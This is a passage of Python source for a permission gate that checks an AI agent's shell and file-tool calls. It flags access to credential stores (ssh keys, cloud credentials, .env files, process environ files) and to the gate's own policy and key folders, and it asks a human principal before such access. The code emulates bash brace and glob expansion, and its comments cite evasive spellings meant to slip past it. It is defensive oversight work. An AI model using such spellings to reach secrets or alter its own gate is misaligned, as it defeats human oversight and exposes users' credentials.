    here: str | None = None                      # the gate's own folder; "" when it cannot be read
    roots: set[str] | None = None
    real: dict[str, str] = field(default_factory=dict)


_scope: contextvars.ContextVar[_Scope | None] = contextvars.ContextVar("exo_gate_scope", default=None)


def _runs_shell(tool: str, args: Mapping) -> bool:
    """A call classify reads as a shell command line. Only these run in their own folder argument (_TOOL_FOLDERS);
    the file tools take unknown arguments and still read from the session's folder."""
    return tool in ("terminal", "shell", "bash", "run_command", "exec_command") or (
        tool not in TOOLS and isinstance(args.get("command"), str) and tool.endswith(("terminal", "shell")))


# The arguments a shell tool takes the folder it runs in from: Exo's bash tool `cwd`, Hermes' terminal and Codex's
# exec_command `workdir` (#311). When a call gives both, each counts. Exo's bash tool ignores `workdir`, but the gate
# does not know which harness a `bash` call comes from, so it counts there too: it only ever adds an ask.
_TOOL_FOLDERS = ("cwd", "workdir")


def _in_tool_folder(fn: _F) -> _F:
    """Run ``fn(action, cwd)`` in one _Scope that holds the folders the tool may read from (#209): ``cwd``, the
    session's working folder as the core passes it. A relative path is resolved from it and from the gate's own
    folder. A shell tool's own folder argument (`cwd`, `workdir`), joined to that folder, is kept apart (tool_cwds),
    beside the folder as the call spells it: the part the folder read adds names the `cd` in that spelling (#516).
    _shell_call reads the line in it (#311)."""
    @functools.wraps(fn)
    def run(action: Any, cwd: str | None = None) -> Any:
        folders: list[str] = []
        own: list[tuple[str, str]] = []
        try:
            tool, args = _args_of(action)
            base = os.path.expanduser(cwd) if isinstance(cwd, str) and cwd else ""
            if base:
                folders.append(os.path.abspath(base))
            if _runs_shell(tool, args):
                for key in _TOOL_FOLDERS:
                    sub = args.get(key)
                    if isinstance(sub, str) and sub:
                        own.append((os.path.join(base, os.path.expanduser(sub)), sub))
        except (TypeError, ValueError, OSError):   # an odd action: classify reports it itself
            pass
        spell: dict[str, str] = {}                 # one folder per joined path, the first spelling kept
        for joined, raw in own:
            spell.setdefault(joined, raw)
        token = _scope.set(_Scope(cwds=tuple(dict.fromkeys(folders)),
                                  tool_cwds=tuple(spell.items())))
        try:
            return fn(action, cwd)
        finally:
            _scope.reset(token)
    return cast(_F, run)


def _brace_seq(s: str) -> list[str] | None:
    """The members of a {x..y[..n]} sequence (``s`` is the text inside the braces), or None."""
    m = _BRACE_SEQ.fullmatch(s)
    if not m:
        return None
    if any(len(t) > 18 for t in m.group(1, 2, 3, 6) if t):
        raise _BraceLimit
    x, y = (int(m[1]), int(m[2])) if m[1] else (ord(m[4]), ord(m[5]))
    step = abs(int(m[3] or m[6] or 1)) or 1
    if abs(y - x) // step >= _BRACE_CAP:
        raise _BraceLimit
    vals = range(x, y + 1, step) if x <= y else range(x, y - 1, -step)
    if not m[1]:
        return [chr(v) for v in vals]
    # a leading zero on either bound pads every member to the longer bound, as bash does: {007..1000..993}
    width = max(len(m[1]), len(m[2])) if any(re.match(r"-?0\d", t) for t in m.group(1, 2)) else 0
    if width and not -2**31 <= min(x, y) <= max(x, y) < 2**31:
        raise _BraceLimit    # bash prints a padded member as a C int, so it wraps past int32
    return [f"{v:0{width}d}" for v in vals]


def _brace_words(tok: str, pool: int = 0, keep: bool = False) -> list[str] | None:
    """``tok`` and the words bash brace expansion makes of it, read as bash's brace_gobbler does: a group
    ends at the first top-level `}` after a comma or `..`; quoted or escaped braces, ${...} and $(...) do
    not expand; a group without a comma is a {x..y[..n]} sequence or literal. None past _BRACE_CAP words (fewer
    for a long word: a million characters in all), past what is left of the call's _BRACE_BUDGET, or past 32
    levels of nesting: callers count that as a hit. ``pool`` 1 charges the Exo-store checks' budget. ``keep`` keeps
    a word the expansion makes more than once, as bash does (`{-s,-s}` is two words: #491)."""
    if "{" not in tok:
        return [tok]
    left = _brace_left.get()
    cap = max(1, min(_BRACE_CAP, (1 << 20) // len(tok), _BRACE_CAP if left is None else left[pool] // _brace_cost(tok)))
    ev: list[tuple[int, str]] = []   # unquoted { } , and `..`; `$` is the brace of ${
    i, quoted = 0, ""
    while i < len(tok):
        c = tok[i]
        if c == "\\" and quoted != "'":
            i += 1
        elif c == "$" and tok.startswith("{", i + 1) and quoted != "'":
            if not quoted:
                ev.append((i + 1, "$"))
            i += 1
        elif quoted:
            quoted = "" if c == quoted else quoted
        elif c in "'\"`":
            quoted = c
        elif c in "$<>" and tok.startswith("(", i + 1):
            depth, i = 0, i + 1
            while i < len(tok):
                if tok[i] == "\\":
                    i += 1
                elif tok[i] in "'\"":
                    j = tok.find(tok[i], i + 1)
                    i = len(tok) if j < 0 else j
                else:
                    depth += {"(": 1, ")": -1}.get(tok[i], 0)
                    if not depth:
                        break
                i += 1
        elif c in "{},":
            ev.append((i, c))
        elif c == "." and tok.startswith(".", i + 1) and not tok.startswith("}", i + 2):
            ev.append((i, "."))
        i += 1
    # Where each { closes: a group's level is the brace depth since it opened, never below zero; it closes
    # at a `}` met at level 0 once a comma or `..` was met at level 0. Groups at level 0 share a bucket.
    match: dict[int, int] = {}
    buckets: list[list] = []          # [depth, still open with no comma yet, will close at the next `}`]
    depth = 0
    for q, k in ev:
        top = buckets[-1] if buckets and buckets[-1][0] == depth else None
        if k in "{$":
            depth += 1
            if k == "{":
                buckets.append([depth, [q], []])
        elif k in ",.":
            if top:
                top[2] += top[1]
                top[1] = []
        else:
            depth -= 1
            if top:
                match.update((f, q) for f in top[2])
                top[0], top[2] = depth, []
                if not top[1]:
                    buckets.pop()
                elif len(buckets) > 1 and buckets[-2][0] == depth:
                    lo = buckets[-2]
                    big, small = (lo[1], top[1]) if len(lo[1]) >= len(top[1]) else (top[1], lo[1])
                    big += small
                    lo[1] = big
                    buckets.pop()
    pos = [q for q, _ in ev]

    def expand(a: int, b: int, level: int) -> list[str]:     # the words of tok[a:b]
        if level > 32:
            raise _BraceLimit
        out, cur = [""], a
        while True:
            n, k, p = 0, bisect.bisect_left(pos, cur), -1
            while k < len(ev) and ev[k][0] < b:
                q, kind = ev[k]
                k += 1
                if kind == "{" and not n:
                    lone = (q == cur or tok[q - 1] in " \t\n") and (q + 1 >= b or tok[q + 1] in " \t\n}")
                    if not lone and match.get(q, b) < b:
                        p = q
                        break
                elif kind in "{$":
                    n += 1
                elif kind == "}" and n:
                    n -= 1
            if p < 0:
                return [o + tok[cur:b] for o in out]
            m = match[p]
            if "," in re.sub(r"\\.", "", tok[p + 1:m], flags=re.S):
                alts, start, n = [], p + 1, 0
                for q, kind in ev[k:bisect.bisect_left(pos, m)] + [(m, ",")]:
                    if kind in "{$":
                        n += 1
                    elif kind == "}" and n:
                        n -= 1
                    elif kind == "," and not n:
                        alts += expand(start, q, level + 1)
                        start = q + 1
                        if len(alts) > cap:
                            raise _BraceLimit
            else:
                alts = _brace_seq(tok[p + 1:m]) or [tok[p:m + 1]]
            if len(out) * len(alts) > cap:
                raise _BraceLimit
            out = [o + tok[cur:p] + x for o in out for x in alts]
            cur = m + 1

    try:
        words = expand(0, len(tok), 0)
    except _BraceLimit:
        return None
    if left is not None and len(words) > 1:
        left[pool] -= sum(map(_brace_cost, words))
    return [tok] + words if keep else list(dict.fromkeys([tok] + words))


def _expand_words(words: list[str]) -> list[str]:
    """_expand_text of each word, in one pass when no word holds a newline. A word with a `${VAR:-word}` form of a
    store variable is also read with VAR unset, so both its value and its default count (#202)."""
    if not any("~" in w or "$" in w for w in words):
        return words
    out = [] if any("\n" in w for w in words) else _expand_text("\n".join(words)).split("\n")
    out = out if len(out) == len(words) else [_expand_text(w) for w in words]
    unset = [_expand_text(w, unset=True) for w in words if _STORE_VAR.search(w)]
    return out + [w for w in dict.fromkeys(unset) if w not in out] if unset else out


def _real(path: str, memo: dict[str, str]) -> str:
    """os.path.realpath of a normalized absolute path; ``memo`` shares the parent folders' lookups."""
    if path not in memo:
        d, base = os.path.split(path)
        if base and d.count("/") >= 64 and d not in memo:
            memo[d] = os.path.realpath(d)      # a deep folder is looked up whole, once
        memo[path] = (path if not base else os.path.realpath(path) if os.path.islink(path)
                      else os.path.join(_real(d, memo), base))
    return memo[path]


def is_sensitive_path(path: str) -> bool:
    """True when ``path`` names one of the secret stores (ssh, cloud and netrc credentials, Exo's key
    stores and run folders, signing keys, token and client-secret files, .env files). Never reads the file. A
    brace set counts when the path or any word bash expands it to names a store, or when it expands past the cap."""
    words = _brace_words(str(path or ""))
    return words is None or _sensitive_words(words)


def _sensitive_words(words: list[str]) -> bool:
    """is_sensitive_path for any of ``words``, which are already brace-expanded. A word is matched as written, and
    as resolved from the gate's own folder and from the tool's (_Scope, #209): its absolute and real forms against
    the dynamic stores, and, when a link led elsewhere, its real form by name too (for a relative word that lands
    below the folder it was read from, only the part below it, so a folder like a repo's `.claude` does not count).
    A form ending in `.pub` is a public key, meant to be shared; a link named `x.pub` is judged by where it leads."""
    words = [w for w in (w.strip() for w in _expand_words(words)) if w]
    if any(_sensitive_re().search(_fold(w.replace("\\", "/"))) for w in words if not _fold(w).endswith(".pub")):
        return True
    scope = _scope.get() or _Scope()
    if scope.roots is None:
        scope.roots = {r for root in _dynamic_secret_paths() for r in (os.path.abspath(root), os.path.realpath(root))}
        try:
            scope.here = os.getcwd()
        except OSError:
            scope.here = ""
    roots, memo = scope.roots, scope.real
    for base in dict.fromkeys(("", *scope.cwds)):       # "": the gate's own folder
        for w in words:
            p = os.path.join(base, w)                    # an absolute word stays as it is
            try:
                a = os.path.normpath(os.path.join(scope.here, p)) if scope.here else os.path.abspath(p)
                real = os.path.realpath(p) if ".." in p.split(os.sep) or a.startswith("//") else _real(a, memo)
                cands = {a, real}
            except (OSError, ValueError):
                real, cands = "", {p}
            cands = {c for c in cands if not _fold(c).endswith(".pub")}
            if any(_fold(c) == _fold(r) or _fold(c).startswith(_fold(r) + os.sep) for c in cands for r in roots) \
                    or _is_run_dir(p, real):
                return True
            if real in cands and real != a and _sensitive_re().search(_fold(_below(real, base or scope.here, w, memo))):
                return True
    return False


def _below(real: str, folder: str | None, word: str, memo: dict[str, str]) -> str:
    """A resolved path as _sensitive_words matches it by name: the part below the ``folder`` a relative ``word`` was
    read from, when it lands there; else the whole path."""
    if os.path.isabs(word) or not folder:
        return real
    try:
        top = _real(os.path.normpath(folder), memo).rstrip(os.sep) + os.sep
    except (OSError, ValueError):
        return real
    return real[len(top):] if real.startswith(top) else real


class StoreSkip:
    """For a tool that walks a folder (grep, glob): which entries below ``root`` it leaves out as secret stores
    (#241). An entry is left out when is_sensitive_path matches it as found or as resolved, so a plainly named
    link into ~/.ssh is left out too. When the path the caller ``named`` is itself a store, as spelled, normalised
    and resolved, the gate asked about it, so what sits below it is read, except a link out of it into another
    store. The root is never left out.
    In a repo's own `.claude` folder (its parent holds `.git`; not HOME's, not CLAUDE_CONFIG_DIR, and no Claude login,
    transcripts or shell snapshots in it) the worktrees, commands, agents and skills subfolders are searched, so a
    worktree checkout under `.claude/worktrees` is too; the rest of it (settings.local.json) stays out.
    Call it on each folder and file as the walk finds it; ``skipped`` counts what it left out. Folders below the
    root are not links (the walk does not follow them), so the file system cost is one lstat per entry, plus a few
    cached existence checks per `.claude` folder."""

    _ODD = re.compile(r"[{}$~\\]|\s$")   # spellings is_sensitive_path expands or trims: ask it directly
    _NO_CLAUDE = re.compile(_SENSITIVE_PATH.pattern.replace(r"\.claude(/[^/]*)*|", ""))
    _CLAUDE_OK = ("worktrees", "commands", "agents", "skills")   # what a repo's .claude holds besides settings
    _CLAUDE_CONF = (".credentials.json", "projects", "shell-snapshots", "history.jsonl")   # a Claude config folder

    def __init__(self, root: str, named: str = "") -> None:
        self.root, self.abs, self.real = root, os.path.abspath(root), os.path.realpath(root)
        # A named store counts only when the folder walked is one: `~/.ssh/..` or a link `x.key` to HOME is not.
        self.whole = bool(named) and all(map(is_sensitive_path, (named, self.abs, self.real)))
        self.roots = {r for x in _dynamic_secret_paths() for r in (os.path.abspath(x), os.path.realpath(x))}
        self.froots = frozenset(map(_fold, self.roots))
        self.below = tuple(_fold(r) + os.sep for r in self.roots)
        self.skipped = 0
        self._repo = {os.path.abspath(_home()): False, os.path.realpath(_home()): False}   # folder -> holds .git

    def _hit(self, path: str) -> bool:
        p, f = path.replace("\\", "/"), _fold(path)
        m = _sensitive_re().search(_fold(p))
        if m and m.group(2).startswith(".claude") and self._project_claude(p):
            m = self._NO_CLAUDE.search(_fold(p))
        return not f.endswith(".pub") and (   # public keys are meant to be shared, as in is_sensitive_path
            bool(m) or f in self.froots or f.startswith(self.below))

    def _project_claude(self, p: str) -> bool:
        """Every `.claude` in ``p`` is a repo's, and ``p`` is that folder or in one of its _CLAUDE_OK subfolders."""
        parts = p.split("/")
        for i in (i for i, x in enumerate(parts) if x == ".claude"):
            top = "/".join(parts[:i]) or "/"
            if top not in self._repo:   # another home that is a git checkout still holds a config folder: not a repo's
                d = os.path.join(top, ".claude")
                self._repo[top] = os.path.lexists(os.path.join(top, ".git")) and not any(
                    os.path.lexists(os.path.join(d, x)) for x in self._CLAUDE_CONF)
            if not self._repo[top] or (parts[i + 1] not in self._CLAUDE_OK if i + 1 < len(parts)
                                       else not os.path.isdir(p)):   # a file called .claude stays out
                return False
        return True

    def __call__(self, path: str) -> bool:
        # rel never starts with a separator, so a root whose real path is `/` gives `/srv/x`, not `//srv/x`.
        rel, link = path[len(self.root):].lstrip(os.sep), os.path.islink(path)
        full, real = os.path.join(self.abs, rel), os.path.realpath(path) if link else os.path.join(self.real, rel)
        if self.whole:
            hit = link and not real.startswith(self.real.rstrip(os.sep) + os.sep) and self._hit(real)
        else:
            hit = (self._hit(full) or (real != full and self._hit(real))
                   or bool(self._ODD.search(rel)) and is_sensitive_path(full))
        self.skipped += hit
        return hit

    def note(self) -> str:
        """The line a tool appends when it left anything out, so a search is never silently incomplete."""
        return f"[skipped {self.skipped} secret-store paths; read one by name to be asked]" if self.skipped else ""


def holds_secret_store(folder: str) -> bool:
    """True when ``folder`` is a secret store or holds a known one (the home folder, EXO_HOME, ``~/.config``...).
    For a tool that hands a whole folder to another program, which cannot leave stores out as StoreSkip does."""
    home = _home()
    stores = [os.path.join(home, s) for s in _SENSITIVE_SAMPLES] + [_exo_home(), *_dynamic_secret_paths()]
    forms = _path_forms(os.path.abspath(folder))
    return is_sensitive_path(folder) or any(s == f or s.startswith(f.rstrip("/") + "/")
                                            for f in forms for x in stores for s in _path_forms(x))


def _glob_hits_secret(tok: str) -> bool:
    """A shell glob that could expand to a secret store. Bare `*` or `*.json` do not count; the last
    component needs three literal characters, or the directory must itself be a secret store. Brace sets
    are expanded first, as bash does; a hit on the word or on any word it expands to counts."""
    words = _brace_words(tok)
    return words is None or _glob_words(words)


def _glob_words(words: list[str]) -> bool:
    """_glob_hits_secret for any of ``words``, which are already brace-expanded."""
    words = [w for w in _expand_words(words) if re.search(r"[*?\[]", w)]
    if not words:
        return False
    home = _home()
    samples = [os.path.join(home, x) for x in _SENSITIVE_SAMPLES] + [os.path.join(_exo_home(), "keys", "seat.key"),
                                                                       _dynamic_secret_paths()[1]]
    secrets = _run_secrets()
    runs = [os.path.join(_exo_home(), "run"), os.path.join(home, ".exo", "run"), ".exo/run"]
    return any(_glob_word(w, home, samples, secrets, runs) for w in words)


_PROC_FILE = re.compile(r"/proc/[^/]+/(?:([^/]+)/[^/]+/)?([^/]+)")


def _glob_part(g: str, s: str) -> bool:
    """Could bash glob part g name s? fnmatch as bash reads it (_fn_glob), except a leading dot in s
    must be spelt with a literal dot in g: bash's *, ? and [ never match a leading dot (#594, verified
    against bash 5.2: `[.]ssh` and `[!a]ssh` do not expand to `.ssh`, while `.*` and `.s*` do). The
    sample folds case (#601); the glob's own wildcards as written (_fold_glob)."""
    g, s = _fold_glob(g), _fold(s)
    if s.startswith(".") and not g.startswith("."):
        return False
    pat = _fn_glob(g)
    return True if pat is None else fnmatch.fnmatchcase(s, pat)


def _home_form(p: str, home: str) -> str:
    """One form of ``p`` only, so the home path's own literal characters never count toward the
    three-literal discipline: a folder under home is read home-relative, anything else as is."""
    p = os.path.normpath(p)
    root = home.rstrip("/") + "/"
    return p[len(root):] if p.startswith(root) else "" if p == home else p


@functools.lru_cache(maxsize=256)
def _glob_folders(samples: tuple[str, ...], home: str, fold: tuple[bool, bool]) -> tuple[tuple[tuple[str, ...], bool], ...]:
    """The folders _glob_folder_hit tries, built once per set of samples (#609 review): each sample's
    folder, and a sample another sample sits below (`.exo/keys` below `.exo/keys/seat.key`); a sample
    file (`auth.json`) is never a folder, or `~/*/*` would hit it. Each as its parts (_home_form), with
    whether it is itself a secret store by name (_sensitive_re on the folded name, #601). ``fold`` keys
    the cache on the fold state those two read."""
    above: set[str] = set()
    for x in samples:
        while (x := os.path.dirname(x)) and x not in above:
            above.add(x)
    out = []
    for f in dict.fromkeys([os.path.dirname(x) for x in samples] + [x for x in samples if x in above]):
        ff = _home_form(f, home)
        out.append((tuple(ff.split("/")), bool(_sensitive_re().search(_fold(ff.replace("\\", "/"))))))
    return tuple(out)


def _glob_folder_hit(d: str, home: str, samples: tuple[str, ...]) -> tuple[bool, bool]:
    """(hit, secret_folder): could the glob folder d name one of the folders of ``samples`` (the samples
    _glob_word is tried against, and the samples themselves, so `.exo/keys` counts as a folder)? The
    parts must match one by one, and the match needs discipline: a part that starts with a literal dot,
    or three literal characters across the matched parts (`.ss?`, `.aw?`, `.exo/key?` qualify; a bare
    `*` does not, so `src/*` and `~/*` stay ordinary). ``secret_folder`` is True when the matched
    folder is itself a secret store by name (_SENSITIVE_PATH: `.ssh`, `.aws`, `.exo/keys`), so any file
    below it counts, as a literal folder does (`~/.ssh/xyz*` already asks). Below such a folder d may
    go deeper than it: its leading parts must match the folder, with the same discipline over them
    (`~/.gnup?/private-keys-v1.d`, `~/.exo/key?/old`), as a literal folder below a store is a store
    too. A secret folder that matches wins over an ordinary one."""
    if not d or not re.search(r"[*?\[]", d):
        return False, False
    parts, hit = _home_form(d, home).split("/"), False
    for fp, secret in _glob_folders(samples, home, (_fold("A") == "a", _sensitive_re() is _SENSITIVE_PATH)):
        if len(parts) < len(fp) or len(parts) > len(fp) and not secret:
            continue
        gp = parts[:len(fp)]
        if not all(_glob_part(g, s) for g, s in zip(gp, fp)):
            continue
        lits = sum(len(re.sub(r"[*?\[\]]", "", g)) for g in gp)
        if not any(g.startswith(".") for g in gp) and lits < 3:
            continue
        if secret:
            return True, True
        hit = True
    return hit, False


def _glob_word(tok: str, home: str, samples: list[str], secrets: list[str], runs: list[str]) -> bool:
    raw = tok.rpartition("/")[0]                         # its folder as written: a link resolves before its `..`
    tok = os.path.normpath(tok)                          # run/./*, run//* and run/jobs/../* are run/*
    proc = _PROC_FILE.fullmatch(tok)                     # /proc/<pid>/environ, or a thread's (#199, #313)
    if proc and (proc[1] is None or _glob_names(proc[1], ("task",))) and _glob_names(proc[2], ("environ",)):
        return True
    d, _, base = tok.rpartition("/")
    stem = re.sub(r"[*?\[\]]", "", base.rsplit(".", 1)[0] if "." in base[1:] else base)
    d_abs = os.path.normpath(d if d.startswith("/") else os.path.join(home, d)) if d and not re.search(r"[*?\[]", d) else ""
    linked = bool(d_abs) and _is_run_dir(raw if raw.startswith("/") else os.path.join(home, raw))
    if linked:                                           # also when normpath lost it: ~/<link to run/jobs>/..
        runs = runs + [d_abs]
    keys = "agent-" in _fold(tok) or ".principal" in _fold(tok)
    if "/" in tok:   # an agent key only when the glob spells its key part, names a run folder, or has a literal
        # folder part around its wildcards (`~/.exo/*/`); not for `*/*default*` or `~/*test*`, which bash cannot
        # expand into a run folder but fnmatch's `*` would match across `/`
        reach = keys or linked or (_fold(d_abs) in {_fold(os.path.normpath(os.path.join(home, r))) for r in runs}
                                   if d_abs else any(
            q and not re.fullmatch(r"[*?]+|\.{1,2}", q) for q in d.split("/")))
        samples = samples + [os.path.join(r, x) for r in runs for x in secrets if reach or x.startswith("exod.")]
    # #594: a glob in the folder part used to give up here, because d_abs is set only for a literal
    # folder. Test the globbed folder against each sample's folder instead: a hit counts as
    # in_store_dir, so the full glob is then matched against the samples. When the matched folder is
    # itself a secret store and the file part is itself a glob, any file below it counts, as a
    # literal folder does -- this is what makes `~/.exo/k*/l*` ask even though no sample file is
    # spelt `l*` (the folder's real files, like lead.key, are not samples). The file part must be a
    # glob: a literal file part under a `*` folder stays a store_write for a write target, as the
    # substitution readings in test_gate_store_name_forms require (`cp x ~/.exo/$(printf keys)/a`
    # is store_write, not credentials). A `.pub` file part stays out, as for a literal folder.
    # A sample counts as a folder only when another sample sits below it (`.exo/keys` below
    # `.exo/keys/seat.key`); a sample file (`auth.json`) is never a folder, or `~/*/*` would hit it.
    folder_hit, secret_folder = _glob_folder_hit(d, home, (*samples, *_SENSITIVE_SAMPLES))
    in_store_dir = linked or folder_hit or bool(d_abs) and _fold(d_abs) != _fold(home) and any(
        _fold(x).startswith(_fold(d_abs) + "/") for x in samples)
    if secret_folder and re.search(r"[*?\[]", base) and not _fold(base).endswith(".pub"):
        return True
    if len(stem) < 3 and not in_store_dir:
        return False
    i = re.search(r"[*?\[]", tok)
    ftok = _fold_glob_path(tok)
    fhead = ftok[:i.start()] if i else ftok      # the folded prefix; a wildcard part's own literal as bash reads it
    if "/" not in ftok:  # a bare name: a run secret by its own name, an agent key only by its `agent-` or key part
        if any(_glob_rx(ftok).match(_fold(x)) for x in secrets if keys or x.startswith("exod.")):
            return True
    tail = re.split(r"[*?\[\]]", ftok)[-1]   # literal: narrow first; a wildcard part's own tail as bash reads it
    xs = [x for x in samples + list(_SENSITIVE_SAMPLES)
          if _fold(x).endswith(tail) and (_fold(x).startswith(fhead) if fhead.startswith("/") else fhead in _fold(x))]
    if not xs:
        return False
    rx = _glob_rx(ftok)
    return any(rx.match(_fold(x)) for x in xs)


@functools.lru_cache(maxsize=4096)
def _glob_rx(tok: str) -> re.Pattern[str]:
    """The bash glob ``tok`` as a pattern, also matching after any `/` when ``tok`` is relative. Read as bash reads it
    (_fn_glob: `[^x]` is `[!x]`, a POSIX class is spelt out, #199); one that could match anything matches everything."""
    pat = _fn_glob(tok)
    return re.compile(("" if tok.startswith("/") else r"(?s:.*/)?") + (r"(?s:.*)\Z" if pat is None else fnmatch.translate(pat)))


# D-038: the Exo store is credentials. Its policies, state (approval grants), ledger, keys, seat files,
# the core sockets, the bus folder (the seat registry signed answers trust and the relay database, #210), the
# plugins folder and the other folders Exo loads code from (_code_paths, #459) steer the gate itself, so a
# write to them always asks the principal. Names that are distinctive match anywhere, in any case too (#601; a relative
# `policies/gates.yaml` may sit in the tool's working folder), and so, by their name whatever EXO_HOME is, do
# `.exo/venv`, `.exo/src` and `.exo/hermes-home/plugins`, as `.exo/plugins` does; the rest of hermes-home (the
# launch script's target folder, a live Hermes's state) is not the code. Absolute paths are also checked
# against EXO_HOME, its principal stores, EXO_PRINCIPAL_STORE, every store root recorded in config
# `principals` (`exo init --root`, `exo import-store --root`), the bus folder and files (_bus_paths) and the
# code folders, among them the venv and Hermes home the home's config.json records (#612).
# $EXO_HOME/update holds the signed-update trust pin, which decides what `exo update` installs (D-073, #133).
# The file names that end a path, one string per name ("\0": any text), which _STORE_NAMES and _store_glob share.
_EXO_STORE_FILES = (
    *(f"policies/{n}.{e}" for n in ("gates", "budget", "interruptions", "approvals", "posting", "brief", "consolidate")
      for e in ("yaml", "yml", "md")),
    "policies/internal-names.txt", "state/approval-grants.json", "state/gate-grants.json", "seat.toml", "seat.json",
    "exod.sock", "agent-\0.sock", "bus/registry.json", "update/allowed_signers",
    *(f"{n}.sqlite{x}" for n in ("ledger", "schedule", "bus/relay") for x in ("", "-wal", "-shm", "-journal")))
_STORE_NAMES = re.compile(
    r"(^|/)(\.exo/(principals/[^/]+/)?(policies|state|keys|run|seats)(/|$)|\.exo/(principals/[^/]+/)?ledger\.sqlite|"
    r"\.exo/(bus|update|plugins)(/|$)|\.exo/(venv|src)(/|$)|\.exo/hermes-home/plugins(/|$)|(" +
    "|".join("[^/]*".join(map(re.escape, f.split("\0"))) for f in _EXO_STORE_FILES) + ")$)")
# $EXO_HOME/config.json names the plugins the core loads (`core_plugins`, this gate among them), their config, the
# environment that runs Hermes and Exo (`venv`), each provider's base_url and headers, and the principal a peer key
# with no seat file speaks for (#525) (D-074, #125). Only the home's own file: a project's config.json is ordinary.
# `.exo/config.json` counts by name whatever EXO_HOME is, as `.exo/update` does, also as a relative name read with
# `.`, `//` and `..` collapsed, and in a word a command prints (`$(echo ~/.exo/config.json)`), while `config.json.bak`
# does not. classify also reads a call it counts in as before (_config_on).
_CONFIG_NAME = re.compile(r"(^|/)\.exo/config\.json(?![\w.~-])")
_HOME_PROTECTED = ("policies", "state", "keys", "run", "seats", "update", "plugins", "config.json")
_STORE_PROTECTED = ("policies", "state", "keys")
# #210: $EXO_HOME/bus, and the bus settings that move a file the gate trusts out of it: the registry, the relay
# database and its sidecars, and the seat keys folder. Each name is read as EXO_BUS_<NAME> and as the legacy
# DIVAN_<NAME>, both when both are set (exo.bus.config takes the first; approvals.seat_pubkeys reads EXO_BUS_REGISTRY
# alone).
_BUS_FILES = (("REGISTRY", ("",)), ("DB", ("", "-wal", "-shm", "-journal")), ("KEYS_DIR", ("",)))
# #217: a descriptor or process folder names whatever the writing process holds there (`/dev/fd/3` after
# `exec 3< f`, `/proc/self/cwd`), which the gate cannot resolve from its own process, so a write through one is
# a store write. It matches anywhere in a path as written, so a relative `dev/fd/3` after `cd /` counts; a
# resolved spelling is not tested (the gate's own realpath of /dev/stdout runs through its own descriptors). The
# writer's stdout and stderr (`/dev/fd/1`, `/proc/self/fd/2`) are left out: a store file opened on them is caught
# where it is opened (_store_touch).
_FD_PATH = re.compile(r"(^|/)(dev/(fd|stdin)|proc/(self|thread-self|\d+|\$[^/]*)(/task/[^/]+)?/(fd|cwd|root|map_files))(/|$)")
_STD_FD = re.compile(r"(^|/)(dev/fd|proc/(self|thread-self)(/task/[^/]+)?/fd)/0*[12]$")
_FD_DIR = re.compile(r"/+(dev|proc(/[^/]+(/task(/[^/]+)?)?)?)")      # cd here, then `> fd/3` or `> self/fd/3`


def _store_roots() -> list[tuple[str, tuple, bool]]:
    """(root, protected top-level names, has principals/<name>/ stores below it)."""
    roots: list[tuple[str, tuple, bool]] = [(_exo_home(), _HOME_PROTECTED, True)]
    if os.environ.get("EXO_PRINCIPAL_STORE"):
        roots.append((os.path.expanduser(os.environ["EXO_PRINCIPAL_STORE"]), _STORE_PROTECTED,
                      False))
    from .store import explicit_roots  # stores made with --root (config `principals`): live, outside the home
    return roots + [(os.path.abspath(r), _STORE_PROTECTED, False) for r in explicit_roots(_exo_home()).values()]


def _bus_paths() -> list[tuple[str, tuple]]:
    """(folder, protected names in it): the bus folder in EXO_HOME, and each bus file the environment sets."""
    out: list[tuple[str, tuple]] = [(_exo_home(), ("bus",))]
    for name, ends in _BUS_FILES:
        for value in filter(None, (os.environ.get(f"EXO_BUS_{name}"), os.environ.get(f"DIVAN_{name}"))):
            folder, base = os.path.split(os.path.abspath(os.path.expanduser(value)))
            out.append((folder, tuple(base + e for e in ends)))
    return out


def _config_code_paths() -> list[str]:
    """The venv and Hermes' plugin home the home's config.json records (`venv`, `hermes_home`): scripts/install.sh
    writes both (its set_cfg lines, #612) and nothing exports EXO_VENV or EXO_HERMES_HOME when the daemon runs, so a
    supported custom install spells its code folders in the file alone. Read like store.explicit_roots reads the
    config's `principals`: a missing or unreadable file, or a value that is not an absolute path once ~ is expanded,
    adds nothing. The environment still takes precedence (Config.get resolves it), so a folder named here joins the
    code paths beside what EXO_VENV or EXO_HERMES_HOME names, it never replaces one."""
    try:
        data = json.loads((Path(_exo_home()) / "config.json").read_text(encoding="utf-8"))
    except (OSError, ValueError):            # a missing file, a stale or bad one: the default spellings stand
        return []
    if not isinstance(data, dict):
        return []
    out = []
    for key, tail in (("venv", ""), ("hermes_home", "plugins")):
        p = os.path.expanduser(data[key]) if isinstance(data.get(key), str) else ""
        if p.startswith("/"):
            out.append(os.path.join(p, tail) if tail else p)
    return out


def _code_paths() -> list[str]:
    """The folders Exo loads code from (#459), each the environment this gate sees spells, as it does EXO_HOME: the
    venv `scripts/install.sh` puts the `exo` package and this gate in (EXO_VENV, else the home's own `venv`; a
    gate.py there decides every later call, a .pth in its site-packages runs on each start), Hermes's plugin home
    (EXO_HERMES_HOME, else the home's own `hermes-home/plugins`: with --with-hermes the core loads exo-gate from
    there), the source copy it clones a git URL into and `exo update` refreshes from (`$EXO_HOME/src`; `exo web`
    reads plugins on `<package>/../../plugins` of the copy too) and every folder EXO_PLUGIN_DIRS names, which
    default_dirs searches first and where a duplicate plugin name keeps the first found. The home's config.json
    records a venv and Hermes home of its own (`venv`, `hermes_home`, #612): those join, read as _config_code_paths
    reads them. Non-absolute spellings are not read: a relative EXO_VENV or dir is a constant of the tool's working
    folder, which the gate cannot see; a `.venv` name is not Exo's (no install script makes one, EXO_VENV is the
    only override)."""
    home = _exo_home()
    out = []
    venv = os.path.expanduser(os.environ.get("EXO_VENV") or "")   # install.sh: ${EXO_VENV:-$EXO_HOME/venv}
    out.append(venv if venv.startswith("/") else os.path.join(home, "venv"))
    if (hermes := os.path.expanduser(os.environ.get("EXO_HERMES_HOME") or "")).startswith("/"):
        out.append(os.path.join(hermes, "plugins"))
    out.append(os.path.join(home, "hermes-home", "plugins"))
    out.append(os.path.join(home, "src"))
    out += [d for d in (os.path.expanduser(p) for p in
                        filter(None, os.environ.get("EXO_PLUGIN_DIRS", "").split(os.pathsep))) if d.startswith("/")]
    return out + [p for p in _config_code_paths() if p not in out]


def _code_forms() -> list[str]:
    """Each absolute folder _code_paths names, as written and resolved: the two spellings _store_word reads."""
    return [f for d in _code_paths() for f in _path_forms(d)]


def _fd_path(p: str) -> bool:
    """A descriptor or process-folder path (_FD_PATH), as written or normalised, other than stdout or stderr spelt
